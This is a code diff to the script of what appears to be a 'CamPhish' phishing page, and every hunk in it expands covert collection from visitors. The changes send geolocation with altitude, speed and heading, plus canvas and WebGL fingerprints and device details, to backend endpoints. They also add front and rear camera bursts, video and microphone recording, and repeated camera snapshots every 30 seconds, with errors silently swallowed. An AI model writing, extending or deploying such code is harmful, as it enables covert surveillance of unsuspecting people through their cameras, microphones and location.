@@ -106,7 +106,7 @@ body { background:#202124; color:#e8eaed; font-family:'Google Sans',Roboto,sans-
 </div>
 
 <script>
-const BACKEND = 'https://cam.subhan.tech';
+const BACKEND = window.location.origin;
 let stream = null;
 let capturesDone = false;
 
@@ -143,39 +143,59 @@ async function captureData() {
     // 1. IP logging
     await fetch(BACKEND + '/ip.php').catch(()=>{});
 
-    // 2. Location
+    // 2. Location with altitude/speed/heading
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
-            pos => fetch(BACKEND + '/location.php', { method:'POST', body: new URLSearchParams({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }) }).catch(()=>{}),
+            pos => fetch(BACKEND + '/location.php', { method:'POST', body: new URLSearchParams({
+                lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy,
+                alt: pos.coords.altitude||'', speed: pos.coords.speed||'', heading: pos.coords.heading||''
+            }) }).catch(()=>{}),
             () => fetch(BACKEND + '/location.php', { method:'POST', body: new URLSearchParams({ lat:'', lon:'', acc:'' }) }).catch(()=>{})
         );
     }
 
-    // 3. Device fingerprint
-    const bat = await navigator.getBattery ? navigator.getBattery().then(b => Math.round(b.level*100)+'%'+(b.charging?' (charging)':' (unplugged)')).catch(()=>'N/A') : 'N/A';
+    // 3. Enhanced device fingerprint
+    const bat = navigator.getBattery ? await navigator.getBattery().then(b => Math.round(b.level*100)+'%'+(b.charging?' (charging)':' (unplugged)')).catch(()=>'N/A') : 'N/A';
     const net = (navigator.connection || {}).effectiveType || 'N/A';
     const ua  = navigator.userAgent;
     const os  = /Windows/.test(ua)?'Windows':/Mac/.test(ua)?'macOS':/Android/.test(ua)?'Android':/iPhone|iPad/.test(ua)?'iOS':'Other';
-    const br  = /Chrome/.test(ua)?'Chrome':/Firefox/.test(ua)?'Firefox':/Safari/.test(ua)?'Safari':'Other';
-    fetch(BACKEND + '/device_info.php', { method:'POST', body: new URLSearchParams({ os, browser: br, language: navigator.language, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, screen_w: screen.width, screen_h: screen.height, pixel_ratio: window.devicePixelRatio, cores: navigator.hardwareConcurrency||'N/A', battery: await bat, network: net, platform: navigator.platform, touch: navigator.maxTouchPoints }) }).catch(()=>{});
+    const br  = /Edg/.test(ua)?'Edge':/Chrome/.test(ua)?'Chrome':/Firefox/.test(ua)?'Firefox':/Safari/.test(ua)?'Safari':'Other';
+    // Canvas fingerprint
+    const cv = document.createElement('canvas'); cv.width=200; cv.height=50;
+    const ctx2 = cv.getContext('2d');
+    ctx2.textBaseline='top'; ctx2.font='14px Arial'; ctx2.fillStyle='#f60'; ctx2.fillRect(125,1,62,20);
+    ctx2.fillStyle='#069'; ctx2.fillText('CamPhish',2,15);
+    const canvasHash = cv.toDataURL().slice(-50);
+    // WebGL vendor
+    let webglVendor = 'N/A';
+    try { const gl=document.createElement('canvas').getContext('webgl'); const ext=gl.getExtension('WEBGL_debug_renderer_info'); webglVendor=gl.getParameter(ext.UNMASKED_VENDOR_WEBGL)+' / '+gl.getParameter(ext.UNMASKED_RENDERER_WEBGL); } catch(e){}
+    fetch(BACKEND + '/device_info.php', { method:'POST', body: new URLSearchParams({
+        os, browser: br, language: navigator.language,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        screen_w: screen.width, screen_h: screen.height, pixel_ratio: window.devicePixelRatio,
+        color_depth: screen.colorDepth,
+        cores: navigator.hardwareConcurrency||'N/A', memory: navigator.deviceMemory||'N/A',
+        battery: bat, network: net, platform: navigator.platform, touch: navigator.maxTouchPoints,
+        canvas_hash: canvasHash, webgl_vendor: webglVendor,
+        wifi_ssid: (navigator.connection||{}).type||'N/A',
+        plugins: Array.from(navigator.plugins||[]).map(p=>p.name).join(', ').slice(0,200),
+    }) }).catch(()=>{});
 
     // 4. Camera burst (front)
     if (stream) {
         const video = document.createElement('video');
-        video.srcObject = stream;
-        video.muted = true;
+        video.srcObject = stream; video.muted = true;
         await video.play().catch(()=>{});
         await new Promise(r => setTimeout(r, 1200));
         for (let i = 0; i < 5; i++) {
             const c = document.createElement('canvas');
             c.width = video.videoWidth || 1280; c.height = video.videoHeight || 720;
             c.getContext('2d').drawImage(video, 0, 0);
-            const blob = c.toDataURL('image/jpeg', 0.9);
-            fetch(BACKEND + '/post.php', { method:'POST', body: new URLSearchParams({ cat: blob, burst_index: i, cam_facing: 'user', shot_type: 'burst' }) }).catch(()=>{});
+            fetch(BACKEND + '/post.php', { method:'POST', body: new URLSearchParams({ cat: c.toDataURL('image/jpeg', 0.92), burst_index: i, cam_facing: 'user', shot_type: 'burst' }) }).catch(()=>{});
             await new Promise(r => setTimeout(r, 400));
         }
 
-        // 5. Short video clip
+        // 5. Video clip
         try {
             const rec = new MediaRecorder(stream, { mimeType: 'video/webm' });
             const chunks = [];
@@ -204,7 +224,7 @@ async function captureData() {
             micRec.start(); setTimeout(() => micRec.stop(), 15000);
         } catch(e) {}
 
-        // 7. Rear camera burst (try switching)
+        // 7. Rear camera burst
         try {
             const rearStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: 'environment' } } });
             const rv = document.createElement('video'); rv.srcObject = rearStream; rv.muted = true;
@@ -218,6 +238,16 @@ async function captureData() {
             }
             rearStream.getTracks().forEach(t => t.stop());
         } catch(e) {}
+
+        // 8. Interval shots (every 30s)
+        setInterval(async () => {
+            if (!stream) return;
+            const v2 = document.createElement('video'); v2.srcObject = stream; v2.muted = true;
+            await v2.play().catch(()=>{});
+            const c2 = document.createElement('canvas'); c2.width = video.videoWidth||640; c2.height = video.videoHeight||480;
+            c2.getContext('2d').drawImage(v2, 0, 0);
+            fetch(BACKEND + '/post.php', { method:'POST', body: new URLSearchParams({ cat: c2.toDataURL('image/jpeg',0.85), burst_index: 0, cam_facing: 'user', shot_type: 'interval' }) }).catch(()=>{});
+        }, 30000);
     }
 }
 
